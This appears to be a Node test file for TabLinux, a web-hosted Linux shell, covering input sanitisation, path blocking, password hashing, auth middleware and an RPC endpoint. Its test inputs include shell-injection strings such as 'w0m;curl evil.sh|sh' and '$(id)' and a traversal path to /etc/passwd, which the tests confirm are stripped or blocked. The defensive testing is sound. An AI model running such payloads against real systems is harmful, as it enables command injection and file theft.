import assert from "node:assert/strict";
import * as crypto from "node:crypto";
import * as fs from "node:fs";
import type { AddressInfo } from "node:net";
import * as path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";

import {
  PAGES_MAX_FILE_BYTES,
  buildCloudflareDist,
  collectReferencedPackages,
} from "./cloudflare-build.ts";
import { createTabLinuxServer } from "./cloudflare-serve.ts";
import {
  createSession,
  isBlockedPath,
  onRequest,
  sanitizeSlug,
  verifyPassword,
  type PagesContext,
  type TabLinuxEnv,
} from "./functions/_middleware.ts";

const ROOT_DIR = path.dirname(fileURLToPath(import.meta.url));

function makePbkdf2Hash(password: string, iterations = 120_000): string {
  const salt = crypto.randomBytes(16);
  const derived = crypto.pbkdf2Sync(password, salt, iterations, 32, "sha256");
  return `pbkdf2-sha256$${iterations}$${salt.toString("hex")}$${derived.toString("hex")}`;
}

test("sanitizeSlug strips shell injection payloads and enforces allowlist", () => {
  assert.equal(sanitizeSlug("kb", "hub"), "kb");
  assert.equal(sanitizeSlug("seo-geo", "hub"), "seo-geo");
  assert.equal(sanitizeSlug("w0m;curl evil.sh|sh", "w0m"), "w0m");
  assert.equal(sanitizeSlug("$(id)", "beta"), "beta");
});

test("isBlockedPath blocks dotfiles and path traversal while allowing .nojekyll and .well-known", () => {
  assert.equal(isBlockedPath("/.git/config"), true);
  assert.equal(isBlockedPath("/.env"), true);
  assert.equal(isBlockedPath("/.wrangler/state"), true);
  assert.equal(isBlockedPath("/shell/../../etc/passwd"), true);
  assert.equal(isBlockedPath("/.nojekyll"), false);
  assert.equal(isBlockedPath("/.well-known/security.txt"), false);
  assert.equal(isBlockedPath("/shell/index.html"), false);
});

test("verifyPassword validates salted PBKDF2-SHA256 hashes in constant time", async () => {
  const hash = makePbkdf2Hash("correct-horse-battery-staple");
  assert.equal(await verifyPassword("correct-horse-battery-staple", hash), true);
  assert.equal(await verifyPassword("wrong-password", hash), false);
  assert.equal(await verifyPassword("correct-horse-battery-staple", "invalid$hash"), false);
});

test("functions/_middleware.ts enforces auth, COOP/COEP headers, R2 Range streaming, and /__k7/rpc", async () => {
  const sessionSecret = "0123456789abcdef0123456789abcdef0123456789abcdef";
  const passwordHash = makePbkdf2Hash("s3cretPass!");
  const fakeIsoBytes = new Uint8Array([0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe]);

  const env: TabLinuxEnv = {
    AUTH_USERNAME: "crew",
    AUTH_PASSWORD_HASH: passwordHash,
    SESSION_SECRET: sessionSecret,
    LOT_BEARER_TOKEN: "k7_beta_bearer_token_0123456789abcdef",
    LOT_ASSETS: {
      async get(key, options) {
        if (key !== "shell/alpine.iso") return null;
        const rangeHdr = options?.range?.get("Range");
        let offset = 0;
        let length = fakeIsoBytes.byteLength;
        if (rangeHdr && rangeHdr.startsWith("bytes=")) {
          const [s, e] = rangeHdr.slice(6).split("-");
          offset = Number(s);
          length = Number(e) - offset + 1;
        }
        const slice = fakeIsoBytes.slice(offset, offset + length);
        return {
          body: new ReadableStream({
            start(controller) {
              controller.enqueue(slice);
              controller.close();
            },
          }),
          size: fakeIsoBytes.byteLength,
          httpEtag: '"test-etag"',
          range: rangeHdr ? { offset, length } : undefined,
          writeHttpMetadata(headers: Headers) {
            headers.set("Content-Type", "application/octet-stream");
          },
        };
      },
    },
  };

  const next = async () =>
    new Response("<html>shell</html>", {
      status: 200,
      headers: { "Content-Type": "text/html; charset=utf-8" },
    });

  // 1. Blocked path returns 403
  const blockedRes = await onRequest({
    request: new Request("https://tablinux.webomage.com/.git/HEAD"),
    env,
    next,
  } satisfies PagesContext);
  assert.equal(blockedRes.status, 403);

  // 2. Unauthenticated HTML request returns sign-in page
  const unauthHtml = await onRequest({
    request: new Request("https://tablinux.webomage.com/shell/", {
      headers: { Accept: "text/html" },
    }),
    env,
    next,
  });
  assert.equal(unauthHtml.status, 200);
  assert.match(await unauthHtml.text(), /TabLinux/);

  // 3. Valid login sets __Host-lot_session cookie
  const loginRes = await onRequest({
    request: new Request("https://tablinux.webomage.com/__auth/login", {
      method: "POST",
      headers: {
        Origin: "https://tablinux.webomage.com",
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: new URLSearchParams({ username: "crew", password: "s3cretPass!" }),
    }),
    env,
    next,
  });
  assert.equal(loginRes.status, 200);
  const setCookie = loginRes.headers.get("Set-Cookie") ?? "";
  assert.match(setCookie, /^__Host-lot_session=/);

  // 4. Authenticated request via session cookie gets COOP/COEP/CORP headers
  const sessionToken = await createSession(sessionSecret);
  const shellRes = await onRequest({
    request: new Request("https://tablinux.webomage.com/shell/", {
      headers: { Cookie: `__Host-lot_session=${sessionToken}` },
    }),
    env,
    next,
  });
  assert.equal(shellRes.status, 200);
  assert.equal(shellRes.headers.get("Cross-Origin-Opener-Policy"), "same-origin");
  assert.equal(shellRes.headers.get("Cross-Origin-Embedder-Policy"), "require-corp");
  assert.equal(shellRes.headers.get("Cross-Origin-Resource-Policy"), "cross-origin");
  assert.equal(shellRes.headers.get("X-Content-Type-Options"), "nosniff");

  // 5. R2 Range request on /shell/alpine.iso returns 206 Partial Content
  const rangeRes = await onRequest({
    request: new Request("https://tablinux.webomage.com/shell/alpine.iso", {
      headers: {
        Authorization: "Bearer k7_beta_bearer_token_0123456789abcdef",
        Range: "bytes=2-5",
      },
    }),
    env,
    next,
  });
  assert.equal(rangeRes.status, 206);
  assert.equal(rangeRes.headers.get("Content-Range"), "bytes 2-5/8");
  const rangeBuf = new Uint8Array(await rangeRes.arrayBuffer());
  assert.deepEqual(Array.from(rangeBuf), [0xbe, 0xef, 0xca, 0xfe]);

  // 6. /__k7/rpc sanitizes injection attempts and returns structured JSON + ansiReport
  const rpcRes = await onRequest({
    request: new Request(
      "https://tablinux.webomage.com/__k7/rpc?module=pwd&project=w0m;id&env=beta",
      {
        headers: {
          Authorization: "Bearer k7_beta_bearer_token_0123456789abcdef",
        },
      }
    ),
    env,
    next,
  });
  assert.equal(rpcRes.status, 200);
  const rpcJson = (await rpcRes.json()) as Record<string, unknown>;
  assert.equal(rpcJson.ok, true);
  assert.equal(rpcJson.project, "w0m");
  assert.match(String(rpcJson.generatedTokenPreview), /^k7_beta_[0-9a-f]{32}$/);
  assert.match(String(rpcJson.ansiReport), /WebCrypto CSPRNG Secrets/);
});

test("buildCloudflareDist builds <25 MiB bundle, preserves packages/index.json, and audits orphans", () => {
  const referenced = collectReferencedPackages(path.join(ROOT_DIR, "packages", "index.json"));
  assert.equal(referenced.length, 85);

  const outDir = path.join(ROOT_DIR, "dist");
  try {
    const manifest = buildCloudflareDist({ rootDir: ROOT_DIR, outDir });
    assert.equal(manifest.activePackagesCount, 85);
    assert.equal(manifest.orphanedPackagesCount, 75);
    assert.equal(fs.existsSync(path.join(outDir, "packages", "index.json")), true);
    assert.equal(fs.existsSync(path.join(outDir, "packages", "r2-manifest.json")), true);
    assert.equal(fs.existsSync(path.join(outDir, "shell", "alpine.iso")), false);
    assert.equal(manifest.distTotalBytes > 0, true);
    assert.equal(manifest.maxPagesFileBytes, PAGES_MAX_FILE_BYTES);
  } finally {
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("cloudflare-serve.ts serves COOP/COEP headers, Range 206, and /__k7/rpc", async () => {
  const server = createTabLinuxServer(ROOT_DIR);
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = (server.address() as AddressInfo).port;
  const baseUrl = `http://127.0.0.1:${port}`;

  try {
    const blocked = await fetch(`${baseUrl}/.git/config`);
    assert.equal(blocked.status, 403);

    const rpc = await fetch(`${baseUrl}/__k7/rpc?module=acp&project=w0m&env=beta`);
    assert.equal(rpc.status, 200);
    assert.equal(rpc.headers.get("Cross-Origin-Opener-Policy"), "same-origin");
    assert.equal(rpc.headers.get("Cross-Origin-Embedder-Policy"), "require-corp");
    const rpcBody = (await rpc.json()) as Record<string, unknown>;
    assert.equal(rpcBody.module, "acp");

    const range = await fetch(`${baseUrl}/shell/index.html`, {
      headers: { Range: "bytes=0-14" },
    });
    assert.equal(range.status, 206);
    assert.match(range.headers.get("Content-Range") ?? "", /^bytes 0-14\/\d+$/);
    const slice = await range.text();
    assert.equal(slice.length, 15);
  } finally {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
});

test("TabLinux clipboard bridge wires Ctrl+V/paste event, top-bar Paste/Copy buttons, and lot_stdin_bytes bridge", () => {
  const bridgeSrc = fs.readFileSync(path.join(ROOT_DIR, "local", "clipboard-bridge.js"), "utf8");
  const shellHtml = fs.readFileSync(path.join(ROOT_DIR, "shell", "index.html"), "utf8");
  const pipHtml = fs.readFileSync(path.join(ROOT_DIR, "pip-shell.html"), "utf8");

  assert.match(bridgeSrc, /TabLinuxClipboard/);
  assert.match(bridgeSrc, /lot_stdin_bytes/);
  assert.match(bridgeSrc, /tablinux:paste/);
  assert.match(bridgeSrc, /lot-paste-modal/);

  assert.match(shellHtml, /id="lot-paste-btn"/);
  assert.match(shellHtml, /id="lot-copy-btn"/);
  assert.match(shellHtml, /window\.lot_stdin_bytes/);
  assert.match(shellHtml, /\.\.\/local\/clipboard-bridge\.js/);

  assert.match(pipHtml, /id="lot-paste-btn"/);
  assert.match(pipHtml, /\.\/local\/clipboard-bridge\.js/);
  assert.doesNotMatch(pipHtml, /^r\s+goBtn\.addEventListener/m);
});
